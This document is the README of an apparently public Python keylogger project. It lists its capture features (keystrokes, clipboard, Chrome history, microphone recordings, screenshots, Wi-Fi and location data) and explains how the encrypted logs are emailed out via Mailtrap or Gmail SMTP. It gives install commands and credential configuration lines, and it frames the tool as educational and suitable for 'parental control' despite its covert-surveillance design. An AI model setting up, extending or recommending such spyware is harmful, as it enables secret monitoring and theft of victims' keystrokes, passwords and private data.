# Multifunctional-Keylogger
 
# 🖥️ Python Keylogger – An Revolutionary Educational Tool in context of Cybersecurity/Ethicalhacking

> ⚠️ **DISCLAIMER**: This project is intended strictly for educational and ethical hacking purposes. Do not deploy or distribute without explicit permission from the device owner. Misuse may be illegal and punishable under cybersecurity laws.

## 💡 What It Does
This Python script is a multi-functional keylogger that collects various types of system and user input data and emails it at regular intervals.

## ✅ Features
- 🎹 Keystroke Logging (via pynput)
- 🖱️ Mouse Movement & Click Tracking
- 📋 Clipboard Capture
- 🔍 Active Window Logging
- 🌐 System Information Grabber
- 📶 Wi-Fi Information
- 📍 Geolocation Lookup
- 🧭 Chrome Browser History Extraction
- 📦 USB Devices Checker
- 🎤 Microphone Audio Recorder (10 seconds)
- 📸 Screenshot Capture (every 60s)
- 🔒 Log Encryption (Fernet)
- 📧 Email Reports (via SMTP)
- 🔁 Auto-Repeat with Threads

## 🧪 Installation

### 📦 Requirements
- Python 3.9+

Install all required modules automatically (already handled in code):
```bash
pip install pyscreenshot pynput sounddevice clipboard cryptography requests pywin32
```
Or install manually:
```bash
pip install -r requirements.txt
```

## ⚙️ Configuration
Edit these two lines in the script:
```python
EMAIL_ADDRESS = "your_mailtrap_or_smtp_email"
EMAIL_PASSWORD = "your_password_or_smtp_token"
SEND_REPORT_EVERY = 40  # interval in seconds
```

You must use a working SMTP server. This example uses Mailtrap for safe testing:
```python
with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
```

You can switch to Gmail SMTP like so:
```python
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
```
🧠 If using Gmail, you may need to generate an App Password.

## 🚀 Running the Keylogger
Run the script:
```bash
python keylogger.py
```

## 📥 Extracting Audio/Images from EML
If you're using Mailtrap or a similar service and want to extract attached WAV recordings from `.eml` files, use `file_extract.py` in the uploaded files section


## 📂 Files & Attachments
The script collects the following:
- Logs of keystrokes and mouse activity
- Clipboard contents
- Active window titles
- System info (hostname, IP, OS, etc.)
- Wi-Fi info
- USB devices info
- Chrome browser history (top 5)
- Microphone audio (sound.wav)
- Screenshots (screenshot.png)

All files are encrypted and emailed to you and optionally auto-deleted afterward.

## 🛡️ Legal Warning
This script should never be used for spying, stalking, or stealing personal information. Use it in your own environment, for:
- Security testing
- Parental control
- Keyboard input analytics
- Ethical hacking training

## 🙋‍♂️ Author
Built with passion by an ethical hacker(@PHHS-07) for funfull practice & joyfull learning.
